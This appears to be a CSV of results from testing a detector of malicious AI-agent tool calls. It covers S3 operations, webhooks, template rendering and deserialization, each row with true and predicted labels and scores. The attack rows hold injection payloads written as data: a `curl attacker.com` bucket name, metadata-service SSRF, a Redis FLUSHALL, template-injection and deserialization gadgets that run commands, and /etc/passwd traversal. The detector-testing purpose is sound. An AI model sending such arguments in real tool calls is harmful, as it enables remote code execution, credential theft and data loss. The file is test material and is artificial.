+s3_operation,"{""operation"": ""get"", ""bucket"": ""bucket-6"", ""key"": ""files/doc6.pdf""}",benign,benign,0.95,2.270907402038574,1367.54052734375
+s3_operation,"{""operation"": ""head"", ""bucket"": ""data"", ""key"": ""reports/report22.csv""}",benign,attack,0.95,599.6517333984375,1334.6865234375
+s3_operation,"{""operation"": ""get"", ""bucket"": ""hr-data"", ""key"": ""employee-ssn.csv""}",attack,attack,0.95,1269.19580078125,778.291015625
+s3_operation,"{""operation"": ""get"", ""bucket"": ""company-secrets"", ""key"": ""credentials.json""}",attack,attack,0.95,1896.029541015625,2.2350447177886963
+s3_operation,"{""operation"": ""list"", ""bucket"": ""audit-logs"", ""prefix"": """"}",attack,attack,0.95,2752.8330078125,863.7656860351562
+s3_operation,"{""operation"": ""list"", ""bucket"": ""`curl attacker.com`"", ""prefix"": """"}",attack,attack,0.95,3212.919189453125,1647.466796875
+s3_operation,"{""operation"": ""get"", ""bucket"": ""http://169.254.169.254/latest/meta-data"", ""key"":",attack,attack,0.95,3912.66259765625,2.251960039138794
+s3_operation,"{""operation"": ""put"", ""bucket"": ""public-bucket"", ""key"": ""shell.php"", ""content"": """,attack,attack,0.95,4504.7470703125,2.2895772457122803
+s3_operation,"{""operation"": ""copy"", ""source"": ""s3://victim-bucket/secrets"", ""dest"": ""s3://atta",attack,attack,0.95,6356.34521484375,3830.717529296875
+s3_operation,"{""operation"": ""get"", ""bucket"": ""../../../../etc"", ""key"": ""passwd""}",attack,attack,0.95,3274.0478515625,2.3248441219329834
+send_webhook,"{""url"": ""https://api.pagerduty.com/webhooks"", ""payload"": {""event"": ""trigger""}}",benign,attack,0.95,2357.436767578125,315.4594421386719
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/2"", ""payload"": {""event"": ""event_2""}}",benign,attack,0.95,650.9116821289062,1008.054931640625
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 10""}}",benign,benign,0.95,2.2700233459472656,851.1589965820312
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 0""}}",benign,attack,0.95,12.666462898254395,674.9129638671875
+send_webhook,"{""url"": ""https://webhook.site/32"", ""payload"": {""data"": 32}}",benign,benign,0.95,1.9335697889328003,834.741455078125
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/6"", ""payload"": {""event"": ""event_6""}}",benign,attack,0.95,650.9116821289062,1008.054931640625
+send_webhook,"{""url"": ""https://webhook.site/14"", ""payload"": {""data"": 14}}",benign,benign,0.95,1.9335697889328003,834.741455078125
+send_webhook,"{""url"": ""https://discord.com/api/webhooks/xxx/yyy"", ""payload"": {""content"": ""Mess",benign,attack,0.95,1702.5494384765625,1024.051025390625
+send_webhook,"{""url"": ""https://webhook.site/8"", ""payload"": {""data"": 8}}",benign,attack,0.95,30.181123733520508,1068.898681640625
+send_webhook,"{""url"": ""https://api.zapier.com/hooks/catch/xxx"", ""payload"": {""data"": ""test""}}",benign,attack,0.95,757.7969970703125,808.082763671875
+send_webhook,"{""url"": ""https://api.github.com/repos/owner/repo/dispatches"", ""payload"": {""event",benign,attack,0.95,2973.6552734375,1151.7337646484375
+send_webhook,"{""url"": ""https://webhook.site/22"", ""payload"": {""data"": 22}}",benign,benign,0.95,1.9263488054275513,711.6801147460938
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/18"", ""payload"": {""event"": ""event_18""}",benign,attack,0.95,632.5836181640625,1306.5928955078125
+send_webhook,"{""url"": ""https://hooks.example.com/webhook/12"", ""payload"": {""event"": ""event_12""}",benign,attack,0.95,632.5836181640625,1306.5928955078125
+send_webhook,"{""url"": ""https://webhook.site/16"", ""payload"": {""data"": 16}}",benign,benign,0.95,1.9335697889328003,834.741455078125
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 20""}}",benign,benign,0.95,2.2700233459472656,851.1589965820312
+send_webhook,"{""url"": ""https://webhook.site/30"", ""payload"": {""data"": 30}}",benign,benign,0.95,1.9335697889328003,834.741455078125
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 26""}}",benign,benign,0.95,2.2700233459472656,851.1589965820312
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 4""}}",benign,attack,0.95,12.666462898254395,674.9129638671875
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 34""}}",benign,benign,0.95,2.2700233459472656,851.1589965820312
+send_webhook,"{""url"": ""https://webhook.site/unique-id"", ""payload"": {""test"": true}}",benign,attack,0.95,1134.7008056640625,707.3326416015625
+send_webhook,"{""url"": ""https://webhook.site/24"", ""payload"": {""data"": 24}}",benign,benign,0.95,1.9335697889328003,834.741455078125
+send_webhook,"{""url"": ""https://hooks.slack.com/services/xxx/yyy/zzz"", ""payload"": {""text"": ""Ale",benign,attack,0.95,1435.612060546875,818.8438720703125
+send_webhook,"{""url"": ""https://api.slack.com/hooks/xxx"", ""payload"": {""text"": ""Message 28""}}",benign,benign,0.95,2.2700233459472656,851.1589965820312
+send_webhook,"{""url"": ""https://internal.corp.net/webhook"", ""payload"": {""token"": ""xxx""}}",attack,attack,0.95,1412.1588134765625,2.239840030670166
+send_webhook,"{""url"": ""http://localhost:6379/"", ""payload"": ""*1\r\n$8\r\nFLUSHALL\r\n""}",attack,attack,0.95,6366.07080078125,3225.2470703125
+send_webhook,"{""url"": ""gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@evil.com>"", ""payload"": {}}",attack,attack,0.95,3704.19091796875,4058.7021484375
+send_webhook,"{""url"": ""http://127.0.0.1:9200/_search"", ""payload"": {""query"": {""match_all"": {}}}",attack,attack,0.95,2659.45361328125,2.176713705062866
+send_webhook,"{""url"": ""http://169.254.169.254/latest/meta-data/iam/security-credentials/"", ""pa",attack,attack,0.95,4099.8642578125,2.2534639835357666
+send_webhook,"{""url"": ""http://2852039166/latest/meta-data/"", ""payload"": {}}",attack,attack,0.95,3489.476806640625,1125.216796875
+send_webhook,"{""url"": ""file:///etc/passwd"", ""payload"": {}}",attack,attack,0.95,2574.66162109375,3548.0556640625
+send_webhook,"{""url"": ""https://admin-api.company.com/notify"", ""payload"": {""secret"": ""yyy""}}",attack,attack,0.95,2888.063232421875,2.234166383743286
+render_template,"{""template"": ""Hello, {{name}}!"", ""data"": {""name"": ""John""}}",benign,attack,0.95,663.0423583984375,1940.70703125
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 16"", ""data"": {""name"": ""User16""}}",benign,benign,0.95,2.263712167739868,1168.699951171875
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 14""}}",benign,attack,0.95,12658228224.0,12658228224.0
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 22""}}",benign,attack,0.95,12658228224.0,12658228224.0
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 30""}}",benign,attack,0.95,12658228224.0,12658228224.0
+render_template,"{""template"": ""User: {{user.name}} ({{user.email}})"", ""data"": {""user"": {""name"": """,benign,benign,0.95,2.220590829849243,601.4348754882812
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 18}}",benign,attack,0.95,8.199112892150879,1270.3406982421875
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 34"", ""data"": {""name"": ""User34""}}",benign,benign,0.95,2.263712167739868,1168.699951171875
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 10}}",benign,attack,0.95,8.199112892150879,1270.3406982421875
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 6"", ""data"": {""name"": ""User6""}}",benign,attack,0.95,29.122920989990234,897.8789672851562
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 20"", ""data"": {""name"": ""User20""}}",benign,benign,0.95,2.263712167739868,1168.699951171875
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 4"", ""data"": {""name"": ""User4""}}",benign,attack,0.95,29.122920989990234,897.8789672851562
+render_template,"{""template"": ""Order #{{order_id}} - Total: ${{total}}"", ""data"": {""order_id"": 123",benign,attack,0.95,574.4887084960938,753.858154296875
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 12""}}",benign,attack,0.95,12658228224.0,12658228224.0
+render_template,"{""template"": ""Hello, {{name}}! Your ID is 24"", ""data"": {""name"": ""User24""}}",benign,benign,0.95,2.263712167739868,1168.699951171875
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 32""}}",benign,attack,0.95,12658228224.0,12658228224.0
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 2}}",benign,benign,0.95,2.2705326080322266,1604.9375
+render_template,"{""template"": ""Items: {% for item in items %}{{item}}, {% endfor %}"", ""data"": {""i",benign,attack,0.95,161.5823516845703,1549.3602294921875
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 8}}",benign,benign,0.95,2.2705326080322266,1604.9375
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 0}}",benign,benign,0.95,2.2705326080322266,1604.9375
+render_template,"{""template"": ""<h1>{{title}}</h1><p>{{content}}</p>"", ""data"": {""title"": ""Welcome""",benign,attack,0.95,16949153792.0,16949153792.0
+render_template,"{""template"": ""Date: {% now 'Y-m-d' %}"", ""data"": {}}",benign,attack,0.95,2376.219482421875,1346.479248046875
+render_template,"{""template"": ""<p>Item: {{item}}</p>"", ""data"": {""item"": ""Product 26""}}",benign,attack,0.95,12658228224.0,12658228224.0
+render_template,"{""template"": ""Order #{{order_id}}"", ""data"": {""order_id"": 28}}",benign,attack,0.95,8.199112892150879,1270.3406982421875
+render_template,"{""template"": ""{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",attack,attack,0.95,2723.389404296875,3078.82763671875
+render_template,"{""template"": ""API Key: {{api_key}}"", ""data"": {""api_key"": ""sk-xxx""}}",attack,attack,0.95,627.64697265625,2.265296459197998
+render_template,"{""template"": ""Password: {{password}}"", ""data"": {""password"": ""secret""}}",attack,attack,0.95,3318.76513671875,2.28523325920105
+render_template,"{""template"": ""{{self._TemplateReference__context.cycler.__init__.__globals__.os.",attack,attack,0.95,7299270144.0,7299270144.0
+render_template,"{""template"": ""{{constructor.constructor('return this.process')().mainModule.requ",attack,attack,0.95,3049.27392578125,3673.2333984375
+render_template,"{""template"": ""${{<%[%'\""}}%\\."", ""data"": {}}",attack,attack,0.95,4823.43896484375,2.246283531188965
+render_template,"{""template"": ""<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')",attack,attack,0.95,3057.5615234375,4933.52392578125
+render_template,"{""template"": ""${T(java.lang.Runtime).getRuntime().exec('id')}"", ""data"": {}}",attack,attack,0.95,2313.029296875,3392.65478515625
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 24, \""name\"": \""item24\""}""}",benign,attack,0.95,1127.806396484375,2430.09521484375
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 18, \""name\"": \""item18\""}""}",benign,attack,0.95,1127.806396484375,2430.09521484375
+deserialize_data,"{""format"": ""msgpack"", ""data"": ""base64_encoded_msgpack""}",benign,attack,0.95,2219.8076171875,1385.8223876953125
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 10, \""name\"": \""item10\""}""}",benign,attack,0.95,1127.806396484375,2430.09521484375
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 16}]}""}",benign,attack,0.95,335.8907775878906,1814.5001220703125
+deserialize_data,"{""format"": ""xml"", ""data"": ""<data><item>test</item></data>""}",benign,attack,0.95,8625.474609375,1735.848388671875
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""name\"": \""test\""}""}",benign,attack,0.95,809.0541381835938,909.7263793945312
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 22, \""name\"": \""item22\""}""}",benign,attack,0.95,1127.81591796875,2430.212646484375
+deserialize_data,"{""format"": ""toml"", ""data"": ""[database]\nhost = \""localhost\""""}",benign,attack,0.95,962.230712890625,593.7894897460938
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 6}]}""}",benign,benign,0.95,2.0298497676849365,1485.7255859375
+deserialize_data,"{""format"": ""yaml"", ""data"": ""name: test\nvalue: 123""}",benign,attack,0.95,580.157470703125,1666.347900390625
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 26}]}""}",benign,attack,0.95,335.8907775878906,1814.5001220703125
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 2\\nname: item2""}",benign,benign,0.95,2.038757085800171,1349.7490234375
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 28}]}""}",benign,attack,0.95,335.8907775878906,1814.5001220703125
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 30\\nname: item30""}",benign,attack,0.95,736.5844116210938,2230.60302734375
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 1}]}""}",benign,benign,0.95,2.0298497676849365,1485.7255859375
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 12\\nname: item12""}",benign,attack,0.95,736.5844116210938,2230.60302734375
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 20, \""name\"": \""item20\""}""}",benign,attack,0.95,1127.806396484375,2430.09521484375
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""id\"": 14, \""name\"": \""item14\""}""}",benign,attack,0.95,1127.806396484375,2430.09521484375
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 32\\nname: item32""}",benign,attack,0.95,736.5844116210938,2230.60302734375
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 4\\nname: item4""}",benign,benign,0.95,2.038757085800171,1349.7490234375
+deserialize_data,"{""format"": ""yaml"", ""data"": ""id: 8\\nname: item8""}",benign,benign,0.95,2.038757085800171,1349.7490234375
+deserialize_data,"{""format"": ""yaml"", ""data"": ""settings:\n  debug: false\n  port: 3000""}",benign,attack,0.95,1648.5155029296875,2987.15673828125
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""users\"": [{\""id\"": 0}]}""}",benign,benign,0.95,2.0298497676849365,1485.7255859375
+deserialize_data,"{""format"": ""json"", ""data"": ""{\""credentials\"": {\""key\"": \""secret\""}}""}",attack,attack,0.95,1430.1868896484375,2.0382375717163086
+deserialize_data,"{""format"": ""php"", ""data"": ""O:8:\""stdClass\"":1:{s:4:\""evil\"";s:20:\""system('id');",attack,attack,0.95,4210.3671875,647.901611328125
+deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/new:subprocess.check_output [['cat',",attack,attack,0.95,6784.01708984375,2393.301513671875
+deserialize_data,"{""format"": ""yaml"", ""data"": ""api_key: sk-xxx""}",attack,attack,0.95,1056.7203369140625,2.0534775257110596
+deserialize_data,"{""format"": ""java"", ""data"": ""rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==""}",attack,attack,0.95,4250.16455078125,613.0848388671875
+deserialize_data,"{""format"": ""yaml"", ""data"": ""!!python/object/apply:os.system ['id']""}",attack,attack,0.95,4537.13525390625,1313.5814208984375
+deserialize_data,"{""format"": ""pickle"", ""data"": ""gASVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlF",attack,attack,0.95,5403.97802734375,2.0529897212982178
+deserialize_data,"{""format"": ""ruby"", ""data"": ""!ruby/object:Gem::Requirement requirements: !ruby/ob",attack,attack,0.95,6321.91015625,3807.4091796875
